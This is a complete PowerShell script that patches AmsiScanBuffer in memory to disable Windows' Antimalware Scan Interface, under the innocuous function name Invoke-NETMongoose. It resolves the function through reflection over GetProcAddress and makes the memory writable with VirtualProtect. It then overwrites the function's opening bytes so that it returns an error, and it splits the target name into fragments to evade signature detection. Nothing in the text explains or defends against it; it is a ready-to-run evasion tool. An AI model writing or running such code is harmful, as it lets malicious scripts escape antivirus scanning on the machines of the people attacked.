Function Invoke-NETMongoose{
# Based on the original code by Gustav Shen
function lf{param($m,$f)$a=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache-and$_.Location.Split('\')[-1]-eq'System.dll'}|%{$_.'GetType'('Microsoft.Win32.UnsafeNativeMethods')}
$t=$a.'GetMethods'()|?{$_.Name-like'Ge*P*oc*ddress'}
$t[0].'Invoke'($null,@(($a.'GetMethod'('GetModuleHandle')).'Invoke'($null,@($m)),$f))}
function g{Param($f,$d=[Void])$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly([System.Reflection.AssemblyName]'R',[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('I',$false).DefineType('M','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])
$t.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$f).SetImplementationFlags('Runtime,Managed')
$t.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$d,$f).SetImplementationFlags('Runtime,Managed')
return $t.CreateType()}
$a="A";$b="msiS";$c="canB";$d="uffer"
[IntPtr]$f=lf amsi.dll ($a+$b+$c+$d);$o=0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lf kernel32.dll VirtualProtect),(g @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType())([Bool])))
$vp.Invoke($f,3,0x40,[ref]$o)>$null
$b=[Byte[]](0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
[System.Runtime.InteropServices.Marshal]::Copy($b,0,$f,12)}
Invoke-NETMongoose
